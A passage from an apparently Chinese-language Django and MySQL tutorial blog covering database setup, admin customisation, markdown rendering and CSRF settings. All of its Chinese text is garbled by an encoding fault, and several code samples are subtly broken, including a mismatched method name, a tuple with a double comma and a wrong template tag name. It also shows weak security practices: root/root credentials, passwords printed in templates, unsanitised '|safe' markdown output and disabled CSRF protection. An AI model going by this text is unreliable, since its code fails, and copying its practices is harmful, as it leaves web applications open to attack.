|\n| foreign key    | æŒ‡å®šå…³é”®è¡¨çš„å¤–é”® |\n\n```mysql\nmysql> use my_db #ä½¿ç”¨my_dbæ•°æ®åº“\nDatabase changed\n\nmysql> create table students(\n    -> id int primary key auto_increment not null,\n    -> name varchar(20),\n    -> age int default 20\n    -> );\n    \nmysql> desc students; #æ˜¾ç¤ºè¡¨ç»“æ„\n+-------+-------------+------+-----+---------+----------------+\n| Field | Type        | Null | Key | Default | Extra          |\n+-------+-------------+------+-----+---------+----------------+\n| id    | int(11)     | NO   | PRI | NULL    | auto_increment |\n| name  | varchar(20) | YES  |     | NULL    |                |\n| age   | int(11)     | YES  |     | 20      |                |\n+-------+-------------+------+-----+---------+----------------+\n3 rows in set (0.01 sec)\n```\n\n### æ’å…¥æ•°æ®\n\n```mysql\ninsert into students (name,age) values ('jwt',18);\n\nmysql> insert into students (name,age) values ('jwt',18); #æ’å…¥æ•°æ®\nQuery OK, 1 row affected (0.03 sec)\n\nmysql> select * from students; #æŸ¥çœ‹studentsè¡¨\n+----+------+------+\n| id | name | age  |\n+----+------+------+\n|  1 | jwt  |   18 |\n+----+------+------+\n1 row in set (0.01 sec)\n```\n\n### dockeréƒ¨ç½²mysqlé—®é¢˜\n\ndockeréƒ¨ç½²æ—¶åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå¼€å¯å®¹å™¨æ—¶**æç¤ºæœ¬åœ°3306ç«¯å£è¢«å ç”¨**ï¼Œäºæ˜¯å°±ä½¿ç”¨è¿™æ¡å‘½ä»¤æŸ¥äº†ä¸‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼š\n\n```\nfuser -v -n tcp 3306\n```\n\nå‘ç°ç¡®å®è¢«å ç”¨äº†ï¼Œäºæ˜¯ç”¨\n\n```bash\nkill -s 9 pid\n```\n\n\næŠŠå ç”¨çš„è¿›ç¨‹å¹²æ‰ï¼Œå†æ¬¡æŸ¥çœ‹æ˜¯å‘ç°è¿˜åœ¨å ç”¨ï¼Œäºæ˜¯å‘ç°æ˜¯***æœ¬åœ°çš„MySQLæœåŠ¡\\*** å¼€ç€ï¼Œå°±é€šè¿‡ï¼š\n\n```bash\nservice mysqld stop(5.0ç‰ˆæœ¬æ˜¯mysqld)\n\nservice mysql stop(5.5.7ç‰ˆæœ¬ä¹‹åæ˜¯mysql)\n```\n\næŠŠMySQLæœåŠ¡å…³æ‰ï¼Œå‘ç°è¿™æ—¶ç«¯å£3306 å·²ç»è¢«é‡Šæ”¾äº†\n\n## åã€Djangoè¿æ¥æ•°æ®åº“\n\n**è¿æ¥æ–¹æ³•**\n\nåœ¨`setting.py`ä¸­é…ç½®\n\n```python\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.mysql',\n        'NAME': 'my_db',\n        'USER': 'root',\n        'PASSWORD': 'root',\n        'HOST': 'localhost',\n        'PORT': '3306'\n    }\n}\n```\n\n**ä¸‹è½½è§£é‡Šå™¨**\n\n- æ–¹æ³•ä¸€:\n\n```bash\npip3 install pymysql\n```\n\nåœ¨`__init__.py`ä¸­é…ç½®æ·»åŠ ä»¥ä¸‹ä»£ç æ¥å¯¼å…¥pymysqlæ¨¡å—æŒ‡å‘ä½¿ç”¨mysqlæ•°æ®åº“\n\n```python\nimport pymysql\npymysql.install_as_MySQLdb()\n```\n\næ‰§è¡Œå®Œä¸Šé¢æ“ä½œå°±æˆåŠŸè¿æ¥ä¸Šå•¦\n\nå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š\n\n```python\nraise ImproperlyConfigured('mysqlclient 1.3.13 or newer is required; you have %s.' % Database.__version__)\ndjango.core.exceptions.ImproperlyConfigured: mysqlclient 1.3.13 or newer is required; you have 0.9.3.\n```\n\nè§£å†³æ–¹æ³•ï¼š\n\næ‰¾åˆ°Pythonå®‰è£…è·¯å¾„ä¸‹æˆ–è™šæ‹Ÿç¯å¢ƒè·¯å¾„ä¸‹`/home/jwt/.virtualenvs/django/lib/python3.6/site-packages/django/db/backends/mysql/base.py`æ–‡ä»¶\n\nå°†ä¸‹é¢ä»£ç æ³¨é‡Šæ‰å°±å¯ä»¥äº†\n\n```python\nif version < (1, 3, 3):\n    raise ImproperlyConfigured(\"mysqlclient 1.3.3 or newer is required; you have %s\" % Database.__version__)\n```\n\n- æ–¹æ³•äºŒï¼š\n\n````bash\n```\nsudo apt install libmysqlclient-dev\npip install mysqlclient\nâ€‹```\n````\n\n## åä¸€ã€Pycharmè¿æ¥æ•°æ®åº“\n\n![](https://img.jwt1399.top//img/20201204104042.png)\n\n> å¦‚æœè¿æ¥MySQLæŠ¥é”™ï¼šServer returns invalid timezone. Go to 'Advanced' tab and set 'serverTimezone' property manually.\n>\n> æœåŠ¡å™¨è¿”å›æ— æ•ˆæ—¶åŒºã€‚è½¬åˆ°â€œé«˜çº§â€é€‰é¡¹å¡å¹¶æ‰‹åŠ¨è®¾ç½®â€œserverTimezoneâ€å±æ€§ã€‚\n\n**è§£å†³åŠæ³•**ï¼š\n\n```mysql\nmysql -u root -p\n\nmysql>show variables like '%time_zone%';\n\nmysql>set global time_zone='+8:00';\n\n#æ¯æ¬¡é‡å¯æœåŠ¡éƒ½è¦é‡æ–°é…ç½®ä¸€éã€‚\nè§£å†³ï¼šmysql>set persist time_zone='+8:00';\n```\n\n## åäºŒã€å–ç”¨æ•°æ®åº“ä¸­æ•°æ®\n\n### 1 ä»æ•°æ®åº“ä¸­è·å–æ‰€æœ‰æ•°æ®\n\n> objects.all()\n\nåœ¨`view.py`ä¸­æ·»åŠ \n\n```python\nfrom .models import UserInfo #å¯¼å…¥model\ndef index(request):\n    userinfo_list = UserInfo.objects.all()#å–å‡ºæ‰€æœ‰æ•°æ®\n    context = {\n        'userinfos':userinfo_list,#ä¼ ç»™æ¨¡æ¿\n    }\n    return render(request,'index.html',context)\n```\n\nåœ¨`templates`ä¸­æ–°å»º`index.html`æ¥æ˜¾ç¤ºè·å–åˆ°çš„æ•°æ®\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>è·å–UserInfoè¡¨ä¸­ä¿¡æ¯</title>\n</head>\n<body>\n{% for userinfo in userinfos %}\n    <h1>  {{ userinfo.username}} ----{{ userinfo.password }}</h1>\n{% endfor %}\n\n</body>\n</html>\n```\n\n![](https://img.jwt1399.top//img/20201204104110.png)\n\n### 2 ä»æ•°æ®åº“ä¸­è·å–ç¬¬ä¸€æ¡æ•°æ®\n\n> objects.first()\n\n### 3 ä»æ•°æ®åº“ä¸­è·å–ä¸€æ¡æ•°æ®\n\n> objects.get(**kwargs)  åªèƒ½æŸ¥è¯¢ä¸€æ¡æ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœåŒ…å«å¤šæ¡çš„è¯ä¼šæŠ¥é”™\n\nåœ¨`view.py`ä¸­æ·»åŠ \n\n```python\nfrom .models import UserInfo\ndef index(request):\n    context = {\n        'result':UserInfo.objects.get(username='ç®€ç®€'), #æŸ¥è¯¢jwtçš„ä¸ªäººä¿¡æ¯\n    }\n    return render(request,'index.html',context)\n```\n\nåœ¨`templates`ä¸­æ–°å»º`index.html`æ¥æ˜¾ç¤ºè·å–åˆ°çš„æ•°æ®\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>è·å–UserInfoè¡¨ä¸­ä¿¡æ¯</title>\n</head>\n<body>\n    <h1>  {{ result.username}}</h1>\n    <h1>  {{ result.sex}}</h1>\n    <h1>  {{ result.mobile_phone}}</h1>\n    <h1>  {{ result.password}}</h1>\n</body>\n</html>\n```\n\n![](https://img.jwt1399.top//img/20201204104131.png)\n\n\n### 4 ä»æ•°æ®åº“ä¸­è·å–åŒ¹é…æ•°æ®\n\n> objects.filter(**kwargs) ä»æ•°æ®åº“çš„å–å¾—åŒ¹é…çš„ç»“æœï¼Œè¿”å›ä¸€ä¸ªå¯¹è±¡åˆ—è¡¨ï¼Œå¦‚æœè®°å½•ä¸å­˜åœ¨çš„è¯ï¼Œå®ƒä¼šè¿”å›[]\n\n## åä¸‰ã€Django-åå°\n\n###  åº”ç”¨æ³¨å†Œ\n\nè‹¥è¦æŠŠappåº”ç”¨æ˜¾ç¤ºåœ¨åå°ç®¡ç†ä¸­ï¼Œéœ€è¦åœ¨`admin.py`ä¸­æ³¨å†Œã€‚æ³¨å†Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œ`æ™®é€šæ³¨å†Œå’Œä½¿ç”¨è£…é¥°å™¨æ³¨å†Œ`\n\n**æ™®é€šæ³¨å†Œæ–¹æ³•**\n\næ‰“å¼€admin.pyæ–‡ä»¶ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n\n```python\nfrom django.contrib import admin\nfrom blog.models import Blog\n  \n#Blogæ¨¡å‹çš„ç®¡ç†å™¨\nclass BlogAdmin(admin.ModelAdmin):\n    list_display=('id', 'caption', 'author', 'publish_time')\n     \n#åœ¨adminä¸­æ³¨å†Œç»‘å®š\nadmin.site.register(Blog, BlogAdmin)\n```\n\nä¸Šé¢æ–¹æ³•æ˜¯å°†ç®¡ç†å™¨å’Œæ³¨å†Œè¯­å¥åˆ†å¼€ã€‚æœ‰æ—¶å®¹æ˜“å¿˜è®°å†™æ³¨å†Œè¯­å¥ï¼Œæˆ–è€…æ¨¡å‹å¾ˆå¤šï¼Œä¸å®¹æ˜“å¯¹åº”ã€‚\n\n**è£…é¥°å™¨æ³¨å†Œ**\n\nè¯¥æ–¹å¼æ¯”è¾ƒæ–¹ä¾¿ï¼Œæ¨èç”¨è¿™ç§æ–¹å¼ã€‚\n\n```python\nfrom django.contrib import admin\nfrom blog.models import Blog\n  \n#Blogæ¨¡å‹çš„ç®¡ç†å™¨\n@admin.register(Blog)\nclass BlogAdmin(admin.ModelAdmin):\n    list_display=('id', 'caption', 'author', 'publish_time')\n```\n\nå‚è€ƒï¼š [DJANGO ADMIN ä¸€äº›æœ‰ç”¨çš„è®¾ç½®](https://www.cnblogs.com/wumingxiaoyao/p/6928297.html)\n\n### å®‰è£…SimpleUiåå°\n\nDjangoè‡ªå¸¦çš„åå°ä¸å¤ªå¥½çœ‹ï¼ŒSimpleUiå®˜æ–¹ä»‹ç»è¯´SimpleUiæ˜¯ä¸€ä¸ªæ›´ç¬¦åˆå›½äººå®¡ç¾å’Œä½¿ç”¨ä¹ æƒ¯çš„ä¸€ä¸ªä¸»é¢˜\n\n**å®˜æ–¹åå°ä¸simpleuiåå°å¯¹æ¯”**\n\n![åŸç”ŸDjangoåå°](https://img.jwt1399.top//img/20201204104556.png)\n\n![simpleuiåå°](https://img.jwt1399.top//img/20201204104614.png)\n\n**å®‰è£…**\n\n```\npip install django-simpleui\n```\n\nå®‰è£…simpleuiåï¼Œåœ¨è‡ªå·±é¡¹ç›®çš„settings.pyæ–‡ä»¶ä¸­INSTALLED_APPSçš„ç¬¬ä¸€è¡ŒåŠ å…¥simpleui\n\nä¸¾ä¸ªä¾‹å­ğŸŒ°ï¼š\n\n```python\n # Application definition\n\n  INSTALLED_APPS = [\n      'simpleui',\n      'django.contrib.admin',\n      'django.contrib.auth',\n      'django.contrib.contenttypes',\n      'django.contrib.sessions',\n      'django.contrib.messages',\n      'django.contrib.staticfiles',\n      ...\n  ]\n```\n\n#### ä¿®æ”¹åå°åç§°\n\nåœ¨urls.pyæˆ–è€…admin.py é‡Œé¢æ·»åŠ  \n\n```python\nfrom django.contrib import admin\nadmin.site.site_header = 'ç®€ç®€'\nadmin.site.site_title = 'ç®€ç®€ åå°ç®¡ç†'\n```\n\n#### ä¿®æ”¹logo\n\nåœ¨setting.py é‡Œé¢æ·»åŠ  \n\n```\nSIMPLEUI_LOGO = 'logoé“¾æ¥'\n```\n\nè¯¦ç»†è¯·çœ‹ï¼š[SimpleUiå¿«é€Ÿä¸Šæ‰‹](https://simpleui.88cto.com/docs/simpleui/QUICK.html#ç›®å½•)\n\n### Django Adminåå°æ˜¾ç¤º å¤šå¯¹å¤šå­—æ®µ\n\n**modelsä»£ç èƒŒæ™¯**ã€ tagæ˜¯å¤šå¯¹å¤šå­—æ®µï¼šä¸€ä¸ªtagå¯ä»¥å¯¹åº”å¤šä¸ªæ–‡ç« ï¼Œå¤šä¸ªtagå¯ä»¥éƒ½å¯¹åº”ä¸€ä¸ªæ–‡ç« ã€‘\n\n```python\nclass Tag(models.Model):\n\tname = models.CharField(max_length=20, verbose_name=\"æ ‡ç­¾åç§°\")\n \nclass Article(models.Model):\n\ttag = models.ManyToManyField(Tag, verbose_name=\"æ ‡ç­¾\")\n```\n\n**admin.pyä¸­å®šä¹‰å‡½æ•°**\n\n```python\n@admin.register(Article)\nclass ArticleAdmin(admin.ModelAdmin):\n    list_display = ['add_time','title','category','show_tag']\n    \n    '''å±•ç¤ºæ–‡ç« çš„æ‰€æœ‰tag'''\n    def show_tag(self, obj):\n        return [t.name for t in obj.tag.all()]\n    show_tags.short_description = \"æ ‡ç­¾\"  # è®¾ç½®åå°è¡¨å¤´\n    filter_horizontal = ('tag',) #å¯é€‰é¡¹ï¼ˆæ–‡ç« æ ‡ç­¾é€‰æ‹©æ—¶çš„æ˜¾ç¤ºæ ·å¼)\n    \n```\n\n![](https://img.jwt1399.top//img/20201204104654.png)\n\n### Django æ¨¡æ¿ æ˜¾ç¤º å¤šå¯¹å¤šå­—æ®µ\n\n **è§†å›¾ views.pyæ–‡ä»¶**\n\n```python\ndef Index(request):\n    \"\"\"é¦–é¡µå±•ç¤º\"\"\"\n    # å–å‡ºæ‰€æœ‰åšå®¢æ–‡ç« \n    all_articles = Article.objects.all()\n    # éœ€è¦ä¼ é€’ç»™æ¨¡æ¿ï¼ˆtemplatesï¼‰çš„å¯¹è±¡\n    context = {'all_articles': all_articles}\n    # renderå‡½æ•°ï¼šè½½å…¥æ¨¡æ¿ï¼Œå¹¶è¿”å›contextå¯¹è±¡\n    return render(request, 'index.html',context)\n```\n\n**åœ¨æ¨¡æ¿ä¸­æ˜¾ç¤ºæ‰€æœ‰æ ‡ç­¾**\n\n```python\n{% for article in article.tag.all %} #å¾ªç¯æ˜¾ç¤ºæ‰€æœ‰æ–‡ç« \n      {% for tag in article.tag.all %} #å¾ªç¯æ˜¾ç¤ºä¸€ä¸ªæ–‡ç« çš„æ‰€æœ‰æ ‡ç­¾\n                   {{tag}}  \n       {% endfor %}\n{% endfor%}\n```\n\nå‚è€ƒï¼šhttps://www.cnblogs.com/xmdykf/p/11403000.html#\n\n### Django-utilså®ç°åå°å›¾ç‰‡å’Œå›¾æ ‡é¢„è§ˆ\n\nå‚è€ƒï¼š[æ¢ç´¢Django utils](https://cloud.tencent.com/developer/article/1372105)\n\n**åˆ©ç”¨`django.utils.html`è½¬ä¹‰å®ç°å›¾æ ‡é¢„è§ˆ**\n\n1.åœ¨`model.py`ä¸­å®šä¹‰å›¾æ ‡é¢„è§ˆå‡½æ•°\n\n```python\nfrom django.utils.html import format_html\n\nclass Category(models.Model):\n    icon = models.CharField(max_length=30, default='fas fa-home',verbose_name='èœå•å›¾æ ‡')\n\t#åå°å›¾æ ‡é¢„è§ˆ\n    def icon_data(self):#è¦å¼•å…¥Font Awesome Free 5.11.1\n        return format_html('<i class=\"{}\"></i>',self.icon) #è½¬åŒ–ä¸º<i class=\"{self.icon}\"></i>\n    icon_data.short_description = 'å›¾æ ‡é¢„è§ˆ'# è®¾ç½®åå°æ˜¾ç¤ºè¡¨å¤´\n\n```\n\n2.åœ¨`admin.py`ä¸­æ³¨å†Œ\n\n```python\n@admin.register(Category)\nclass CategoryAdmin(admin.ModelAdmin):\n    list_display = ['icon','icon_data']#åœ¨åˆ—è¡¨é¡µæ˜¾ç¤ºçš„æ¡ç›®\n    list_editable = ['icon'] #åœ¨åˆ—è¡¨é¡µå³å¯ä¿®æ”¹\n```\n\n<img src=\"https://img.jwt1399.top//img/20201204104718.png\"  />\n\n**åˆ©ç”¨`django.utils.html`è½¬ä¹‰å®ç°å›¾ç‰‡é¢„è§ˆ**\n\n1.åœ¨`model.py`ä¸­å®šä¹‰å›¾ç‰‡é¢„è§ˆå‡½æ•°\n\n```python\nclass Article(models.Model):\n    title = models.CharField(max_length=50, verbose_name='æ–‡ç« æ ‡é¢˜')\n    cover = models.URLField(max_length=200, default='https://i.loli.net/2020/04/23/lJLjEtbs2NFwynQ.jpg', verbose_name='æ–‡ç« å°é¢')\n\t#åå°å›¾ç‰‡é¢„è§ˆ\n    def cover_preview(self):\n        return format_html('<img src=\"{}\" width=\"200px\" height=\"150px\"/>',self.cover,)\n    cover_preview.short_description = 'æ–‡ç« å°é¢é¢„è§ˆ'\n```\n\n2.åœ¨`admin.py`ä¸­æ³¨å†Œ\n\n```python\n@admin.register(Article)\nclass ArticleAdmin(admin.ModelAdmin):\n    #è®¾ç½®è¦æ˜¾ç¤ºåœ¨åå°åˆ—è¡¨ä¸­çš„å­—æ®µ\n    list_display = ('title','cover_preview',)#ã€åœ¨åˆ—è¡¨é¡µé¢„è§ˆå›¾ç‰‡ã€‘\n    list_display_links = ('title',) #è®¾ç½®å“ªäº›å­—æ®µå¯ä»¥ç‚¹å‡»è¿›å…¥ç¼–è¾‘ç•Œé¢\n    readonly_fields = ('cover_preview',)#åªè¯»å­—æ®µï¼Œæ·»åŠ è¯¥å­—æ®µæ‰èƒ½åœ¨åå°ç¼–è¾‘é¡µé¢„è§ˆå°é¢ï¼Œå¦åˆ™æŠ¥é”™\n    fieldsets = (  #åå°æ–‡ç« ç¼–è¾‘é¡µé¢æ’ç‰ˆ\n        ('ç¼–è¾‘æ–‡ç« ', {#ã€åœ¨ç¼–è¾‘é¡µé¡µé¢„è§ˆå›¾ç‰‡ã€‘\n            'fields': ('title',,'cover','cover_preview',)\n        })\n    )\n```\n\n![åˆ—è¡¨é¡µé¢„è§ˆå›¾ç‰‡](https://img.jwt1399.top//img/20201204104740.png)\n\n![ç¼–è¾‘é¡µé¢„è§ˆå›¾ç‰‡](https://img.jwt1399.top//img/20201204104813.png)\n\n### åå°å¼•å…¥django-import-export\n\n**å®‰è£…æ’ä»¶**\n\n```bash\npip install django-import-export\n```\n\n**åœ¨`settings.py`æ³¨å†Œ**\n\n```python\nINSTALLED_APPS = (\n    ...\n    'import_export',\n)\n```\n\nè¿˜æœ‰ä¸€ä¸ªå¯é€‰çš„é…ç½®ï¼Œæˆ‘é€šå¸¸è¿™æ ·æ·»åŠ :\n\n```python\nIMPORT_EXPORT_USE_TRANSACTIONS = True\n```\n\né»˜è®¤å€¼ä¸ºFalseã€‚å®ƒç¡®å®šåº“æ˜¯å¦ä¼šåœ¨æ•°æ®å¯¼å…¥ä¸­ä½¿ç”¨æ•°æ®åº“äº‹åŠ¡ï¼Œä»¥ç¡®ä¿å®‰å…¨ã€‚\n\n **åœ¨Djangoåå°ä¸­ä½¿ç”¨**\n\nåœ¨`admin.py`é‡Œä½¿ç”¨`ImportExportModelAdmin`ï¼Œè€Œä¸æ˜¯`admin.ModelAdmin`\n\n```javascript\nfrom import_export.admin import ImportExportModelAdmin\nfrom django.contrib import admin\nfrom .models import Person\n@admin.register(Person)\nclass PersonAdmin(ImportExportModelAdmin):\n    pass\n```\n\næ·»åŠ ä¹‹ååˆ·æ–°é¡µé¢ä½ å°±ä¼šçœ‹åˆ°å¯¼å…¥å’Œå¯¼å‡ºæŒ‰é’®ã€‚\n\nå‚è€ƒï¼š[django-import-exportæ’ä»¶ä½¿ç”¨æ•™ç¨‹](https://cloud.tencent.com/developer/article/1445272)\n\n### å¼•å…¥MarkDown\n\nmarkdownç¼–è¾‘å™¨ï¼š[django-mdeditor](https://github.com/pylixm/django-mdeditor)\n\nmarkdownå‰å°è§£æï¼š\n\n[Mistune](https://github.com/lepture/mistune)\n\n[Python-markdown](https://github.com/Python-Markdown/markdown)\n\næ¨èä½¿ç”¨Mistuneï¼Œè§£æé€Ÿåº¦æ¯”Python- markdownå¿«\n\n1.åœ¨ä½ çš„åº”ç”¨ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸º `templatetags` çš„æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å…¶ä¹‹ä¸‹æ–°å»ºä¸¤ä¸ª `Python` æ–‡ä»¶ï¼š`__init__.py`(ä½¿`templatetags`æˆä¸ºä¸€ä¸ªåŒ…)å’Œ`blog_tags.py`ã€‚ç¼–è¾‘`blog_tags.py`æ–‡ä»¶ï¼š\n\n```python\nimport re\nfrom random import randint\nfrom django import template\nfrom django.template.defaultfilters import stringfilter\n\nregister = template.Library()\n\n@register.simple_tag()\ndef random_num():\n    return randint(1, 10)\n\n\n@register.filter(is_safe=True)\n@stringfilter\ndef custom_markdown(content):\n    code_list = re.findall(r'<pre><code class=\"lang-(.*)\">', content, re.M)\n    for code in code_list:\n        content = re.sub(r'<pre><code class=\"(.*)\">',\n                         '<pre class=\"language-{code}\"><code class=\"language-{code}\">'.format(code=code.lower()), content,1)\n    return content\n```\n\n2.åœ¨ `views.py` ä¸­\n\n```python\nfrom django.shortcuts import render\nfrom .models import Article\nimport mistune\ndef article_detail(request,id):\n    \"\"\"æ–‡ç« è¯¦æƒ…é¡µ\"\"\"\n    # å–å‡ºç›¸åº”çš„æ–‡ç« \n    article = Article.objects.get(id=id)\n    #å‰å°MKè§£æ\n    mk = mistune.Markdown()\n    output = mk(article.content)\n    # éœ€è¦ä¼ é€’ç»™æ¨¡æ¿çš„å¯¹è±¡\n    context = {\n        'article':article,\n        'article_detail_html': output,\n    }\n    # è½½å…¥æ¨¡æ¿ï¼Œå¹¶è¿”å›contextå¯¹è±¡\n    return render(request,'article_detail.html',context)\n```\n\n3.åœ¨æ¨¡æ¿æ–‡ä»¶ä¸­ï¼š\n\n```python\n{% load blog_tag %}\n{{ article_detail_html | custom_markdown | safe }}\n```\n\n### å…¨å±€å˜é‡\n\næˆ‘ä»¬ç»å¸¸åœ¨htmlä¸­ä½¿ç”¨{{ article.name }}è¿™æ ·çš„æ¨¡æ¿å˜é‡ï¼Œè¿™äº›å˜é‡æ˜¯æˆ‘ä»¬åœ¨è§†å›¾å‡½æ•°ä¸­æå‰å®šä¹‰å¥½çš„å˜é‡ï¼Œé€šè¿‡render()ç­‰æ–¹æ³•ä¼ é€’åˆ°æ¨¡æ¿ä¸­ã€‚\n\nä½†æ˜¯ï¼Œè¿˜æœ‰ä¸€ç±»å˜é‡ï¼Œä¸éœ€è¦ä½¿ç”¨render()ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼Œä¹Ÿèƒ½åœ¨htmlä¸­ä½¿ç”¨è¯¥å˜é‡ï¼Œåƒè¿™æ ·çš„å˜é‡ï¼Œå°±å«åšå…¨å±€å˜é‡ã€‚\n\n1.å®šä¹‰ä½ è‡ªå·±çš„å…¨å±€å˜é‡ï¼Œæˆ‘å®šä¹‰åœ¨`view.py`ä¸­,ä½ å¯ä»¥å®šä¹‰åœ¨ä»»ä½•æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨ç¬¬äºŒæ­¥ä¸­æ³¨å†Œè·¯å¾„ç›¸åº”è¦ä¿®æ”¹\n\n```python\ndef global_setting(request):\n    \"\"\"\n    å…¨å±€å˜é‡\n    \"\"\"\n    category_nav = Category.objects.filter(add_menu=True).order_by('index')\n    return {\n        'category_nav': category_nav\n    }\n```\n\n**2.ä¿®æ”¹`settings.py`ä¸­çš„å…¨å±€å˜é‡`TEMPLATES`**\n\n```python\n'context_processors': [\n    'django.template.context_processors.debug',\n    'django.template.context_processors.request',\n    'django.contrib.auth.context_processors.auth',\n    'django.contrib.messages.context_processors.messages',\n    'blog.views.global_setting',#è‡ªå®šä¹‰çš„å…¨å±€å˜é‡\n],\n```\n\næ·»åŠ æ¨¡ç‰ˆå…¨å±€å˜é‡ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ä½ç½®æ¸²æŸ“æ¨¡ç‰ˆé¡µé¢æ— éœ€å†æ‰‹åŠ¨å†™ç›¸å…³ä»£ç å³å¯ä½¿ç”¨è¯¥å˜é‡\n\nå‚è€ƒï¼š[Djangoæ¨¡æ¿è®¾ç½®å…¨å±€å˜é‡(é»˜è®¤å˜é‡)](https://blog.csdn.net/weixin_42134789/article/details/81239605)\n\n## åå››ã€å…¶ä»–æ“ä½œ\n\n### ç”Ÿæˆrequirements.txt\n\n```bash\npip3 freeze > requirements.txt #ç”Ÿæˆé¡¹ç›®æ‰€åŒ…å«æ¨¡å—æ¸…å•\n\npip3 install -r requirements.txt #ä¸€é”®å®‰è£…ä¸Šæ–¹æ–‡æ¡£ä¸­çš„æ¨¡å—\n```\n\n###  ä¸Šä¼ gitä»“åº“\n\n```bash\ngithubä¸Šæ–°å»ºä»“åº“\n#é¦–æ¬¡æœ¬åœ°æ‰§è¡Œï¼š\ngit init\ngit add .\ngit commit -m \"xxxxxxxx\"\ngit remote add origin https://github.com/jwt1399/ä»“åº“å.git\ngit push -u origin master\n\n#ä»¥åæ‰§è¡Œä¸Šä¼ ï¼š\ngit add .\ngit commit -m \"xxxxx\"\ngit push -u origin master\n#ä¸æƒ³ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå†™åœ¨`.gitignore`ä¸­\n```\n\n### CSRF\n\n> djangoä¸ºç”¨æˆ·å®ç°é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ çš„åŠŸèƒ½ï¼Œé€šè¿‡ä¸­é—´ä»¶ django.middleware.csrf.CsrfViewMiddleware æ¥å®Œæˆã€‚è€Œå¯¹äºdjangoä¸­è®¾ç½®é˜²è·¨ç«™è¯·æ±‚ä¼ªé€ åŠŸèƒ½æœ‰åˆ†ä¸ºå…¨å±€å’Œå±€éƒ¨ã€‚\n\n**å…¨å±€ï¼š**\n\nä¸­é—´ä»¶ django.middleware.csrf.CsrfViewMiddlewareã€åœ¨setting.pyçš„MIDDLEWAREä¸­ã€‘\n\næƒ³å–æ¶ˆç›´æ¥æ³¨é‡Šè¿™æ¡è¯­å¥\n\n**å±€éƒ¨ï¼š**\n\n@csrf_protectï¼Œä¸ºå½“å‰å‡½æ•°å¼ºåˆ¶è®¾ç½®é˜²è·¨ç«™è¯·æ±‚ä¼ªé€ åŠŸèƒ½ï¼Œå³ä¾¿settingsä¸­æ²¡æœ‰è®¾ç½®å…¨å±€ä¸­é—´ä»¶ã€‚\n\n@csrf_exemptï¼Œå–æ¶ˆå½“å‰å‡½æ•°é˜²è·¨ç«™è¯·æ±‚ä¼ªé€ åŠŸèƒ½ï¼Œå³ä¾¿settingsä¸­è®¾ç½®äº†å…¨å±€ä¸­é—´ä»¶ã€‚\n\nåœ¨views.pyä¸­æ·»åŠ ,@csrf_exemptæ·»åŠ åˆ°å¯¹åº”å‡½æ•°ä¸Š\n\n```python\nfrom django.views.decorators.csrf import  csrf_exempt,csrf_protect\n\n@csrf_exempt #åŠ ä¸Šè¿™ä¸ªå°±ä¸å—CSRFä¿æŠ¤ï¼Œæ ‡è¯†ä¸€ä¸ªè§†å›¾å¯ä»¥è¢«è·¨åŸŸè®¿é—®\ndef post(request):\n        return HttpResponse(\"hi\")\n\n```\n\nå‚è€ƒï¼š[Djangoè¿›é˜¶ä¹‹CSRF](https://www.cnblogs.com/zhaof/p/6281482.html)\n\n### `__init__.py`ä½œç”¨\n\nè®© Python æŠŠè¯¥ç›®å½•å½“æˆä¸€ä¸ªå¼€å‘åŒ… (å³ä¸€ç»„æ¨¡å—)æ‰€éœ€çš„æ–‡ä»¶ï¼Œå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹å¯¼å…¥(import)ã€‚ è¿™æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œä¸€èˆ¬ä½ ä¸éœ€è¦ä¿®æ”¹å®ƒã€‚\n\n## åäº”ã€Djangoå¼•å…¥docsifyæ–‡æ¡£\n\n### docsify ä»‹ç»\n\n>  **docsifyï¼š**ä¸€ä¸ªç¥å¥‡çš„æ–‡æ¡£ç«™ç‚¹ç”Ÿæˆå™¨ã€‚\n>\n> **å®˜ç½‘ï¼š**https://docsify.js.org/\n\næˆ‘ä»¬åœ¨å¼€å‘é¡¹ç›®æ—¶ï¼Œéœ€è¦ä¸€ä»½ç²¾è‡´çš„å¼€å‘æ–‡æ¡£ï¼Œé‚£ä¹ˆä½¿ç”¨ `docsify` æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œ`docsify` æ˜¯ä¸€ä¸ªå¿«é€Ÿç”Ÿæˆ `Vue` é£æ ¼æ–‡æ¡£çš„å·¥å…·ï¼Œå®ƒç›´æ¥åŠ è½½ `Markdown` æ–‡ä»¶å¹¶åŠ¨æ€æ¸²æŸ“ï¼ŒåŒæ—¶è¿˜å¯ä»¥ç”Ÿæˆå°é¢é¡µã€‚æˆ‘ä»¬åªéœ€è¦å†™å®Œ `Markdown` æ–‡æ¡£ï¼Œå°±å¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹æ–¹å›¾ç‰‡çš„æ–‡æ¡£é¡µé¢äº†ã€‚\n\n![](https://img.jwt1399.top//img/20210131103745.png)\n\nåŸºç¡€çš„é…ç½®å’Œæ­å»ºæˆ‘è¿™é‡Œå°±ä¸è¯´äº†ï¼Œå®˜ç½‘æœ‰è¯¦ç»†çš„æ­¥éª¤\n\n### docsify åµŒå…¥Djangoé¡¹ç›®\n\n1.æ ¹æ®å®˜ç½‘æ•™ç¨‹ç”Ÿæˆ `docs` æ–‡ä»¶å¤¹\n\n![](https://img.jwt1399.top//img/20210131110145.png)\n\n2.å°† `docs` æ–‡ä»¶å¤¹ï¼ˆé™¤å»index.htmlï¼‰æ”¾å…¥ **Django** é¡¹ç›®çš„ `static` 